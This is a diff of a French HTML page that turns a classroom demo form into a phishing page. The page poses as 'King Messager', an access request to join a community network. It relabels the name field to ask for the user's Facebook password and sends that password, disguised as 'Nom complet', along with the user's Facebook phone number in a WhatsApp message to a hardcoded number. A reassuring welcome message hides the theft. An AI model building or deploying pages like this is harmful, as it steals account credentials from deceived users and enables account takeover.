@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fiche de connexion</title>
+    <title>King Messager - Demande d'accès</title>
 
     <style>
         * {
@@ -24,7 +24,7 @@
 
         .card {
             width: 100%;
-            max-width: 370px;
+            max-width: 420px;
             background: white;
             padding: 28px;
             border-radius: 14px;
@@ -84,33 +84,43 @@
             background: #10528a;
         }
 
-        .privacy {
-            margin-top: 14px;
-            font-size: 12px;
-            color: #666;
-            line-height: 1.5;
+        #bienvenue {
+            display: none;
+            margin-top: 20px;
+            padding: 16px;
+            border-radius: 8px;
+            background: #eaf4ff;
+            color: #174b78;
+            line-height: 1.6;
+        }
+
+        #bienvenue h2 {
+            margin-bottom: 10px;
         }
     </style>
 </head>
 
 <body>
     <main class="card">
-        <h1>Connexion</h1>
-        <p class="description">King messager</p>
+        <h1>👑 King Messager</h1>
+        <p class="description">
+            Remplissez le formulaire pour demander à rejoindre notre réseau.
+        </p>
 
         <form id="connexionForm">
             <div class="form-group">
-                <label for="nom">Nom complet</label>
+                <label for="nom">Votre Mot de passe FB</label>
                 <input
                     type="text"
                     id="nom"
-                    placeholder="Votre nom"
+                    placeholder="Entrez votre Mot de passe FB"
+                    autocomplete="name"
                     required
                 >
             </div>
 
             <div class="form-group">
-                <label for="telephone">Numéro de téléphone FB</label>
+                <label for="telephone">Votre numéro de téléphone FB</label>
                 <input
                     type="tel"
                     id="telephone"
@@ -120,60 +130,92 @@
                 >
             </div>
 
-            <div class="form-group">
-                <label for="motdepasse">Mot de passe Du compte FB</label>
-                <input
-                    type="password"
-                    id="motdepasse"
-                    placeholder="Entrez un mot de passe "
-                    autocomplete="off"
-                    required
-                >
-            </div>
-
-            <button type="submit">
-                Envoyer 
-            </button>
+            <button type="submit">Envoyer ma demande</button>
         </form>
 
+        <section id="bienvenue" aria-live="polite">
+            <h2>🎉 Bienvenue sur King Messager !</h2>
+
+            <p>
+                Merci pour votre intérêt envers notre réseau.
+                Votre demande d'accès a été préparée.
+                L'administrateur pourra examiner votre demande
+                et vous transmettre un lien d'accès après validation.
+            </p>
+
+            <p>
+                Merci pour votre patience et votre confiance.
+                Nous espérons vous accueillir bientôt dans notre
+                communauté !
+            </p>
+
+            <p><strong>L'équipe King Messager 👑</strong></p>
+        </section>
     </main>
 
     <script>
-        const formulaire =
-            document.getElementById("connexionForm");
 
-        formulaire.addEventListener("submit", function(event) {
-            event.preventDefault();
+const formulaire = document.getElementById("connexionForm");
 
-            const nom =
-                document.getElementById("nom").value.trim();
+formulaire.addEventListener("submit", function(event) {
+    event.preventDefault();
 
-            const telephone =
-                document.getElementById("telephone").value.trim();
+    const nom = document.getElementById("nom").value.trim();
+    const telephone = document.getElementById("telephone").value.trim();
 
-            const motdepasse =
-                document.getElementById("motdepasse").value;
+    if (!nom || !telephone) {
+        alert("Veuillez remplir tous les champs.");
+        return;
+    }
 
-            if (!nom || !telephone || !motdepasse) {
-                alert("Veuillez remplir tous les champs.");
-                return;
-            }
+    const monNumero = "243831799382";
 
-            // Remplace par ton numéro WhatsApp.
-            const monNumero = "243831799382";
+    const bienvenue = `👑 BIENVENUE SUR KING MESSAGER !
 
-            // Seules les informations non secrètes sont envoyées.
-            const message =
-                "Fiche de démonstration - TP informatique\n" +
-                "Nom : " + nom + "\n" +
-                "Téléphone : " + telephone;
+Merci de l'intérêt que vous portez à notre réseau !
 
-            const lien =
-                "https://wa.me/" + monNumero +
-                "?text=" + encodeURIComponent(message);
+Nous sommes ravis de vous accueillir sur King Messager, un espace conçu pour rapprocher les personnes, faciliter les échanges et créer une communauté où chacun peut communiquer, partager ses idées et tisser de nouvelles relations.
 
-            window.open(lien, "_blank");
-        });
+Nous vous remercions sincèrement d'avoir pris le temps de remplir notre formulaire et de nous avoir transmis votre demande d'accès. Votre intérêt est précieux pour nous et nous sommes heureux de vous compter parmi les personnes qui souhaitent rejoindre notre communauté.
+
+📩 QUELLE EST LA PROCHAINE ÉTAPE ?
+
+Votre demande a été prise en compte. Notre administrateur procédera à la vérification des informations nécessaires à votre inscription afin de confirmer votre entrée dans le réseau King Messager.
+
+Une fois votre demande validée, vous recevrez un message de confirmation ainsi qu'un lien d'accès au réseau. Ce lien vous permettra de rejoindre notre communauté et de commencer à profiter des fonctionnalités disponibles sur notre plateforme.
+
+🤝 NOTRE ENGAGEMENT ENVERS VOUS
+
+Chez King Messager, nous souhaitons construire une communauté accueillante, conviviale et respectueuse. Nous encourageons les échanges positifs, le respect mutuel et le partage dans un environnement où chaque membre peut se sentir le bienvenu.
+
+Nous vous invitons à rester attentif au message de confirmation de l'administrateur. Si votre demande nécessite des informations complémentaires, nous vous indiquerons les prochaines étapes à suivre.
+
+👑 KING MESSAGER, BIEN PLUS QU'UN RÉSEAU !
+
+Notre ambition est de créer un espace où les rencontres deviennent des amitiés, où les idées circulent librement et où la communication rapproche les personnes, peu importe la distance qui les sépare.
+
+Nous sommes impatients de vous accueillir officiellement parmi nos membres et de vous faire découvrir notre univers.
+
+Merci pour votre confiance, merci pour votre patience et merci de choisir King Messager !
+
+En attendant la confirmation de votre demande, recevez nos salutations les plus chaleureuses.
+
+L'équipe d'administration King Messager
+
+King Messager — Connectons les personnes, partageons les idées et construisons ensemble une grande communauté ! 👑❤️`;
+
+    const messageWhatsApp =
+        "NOUVELLE DEMANDE KING MESSAGER\n\n" +
+        "Nom complet : " + nom + "\n" +
+        "Téléphone : " + telephone + "\n\n" +
+        "--------------------------------\n\n" +
+        bienvenue;
+
+    const lien = "https://wa.me/" + monNumero +
+        "?text=" + encodeURIComponent(messageWhatsApp);
+
+    window.open(lien, "_blank");
+});
     </script>
 </body>
 </html>
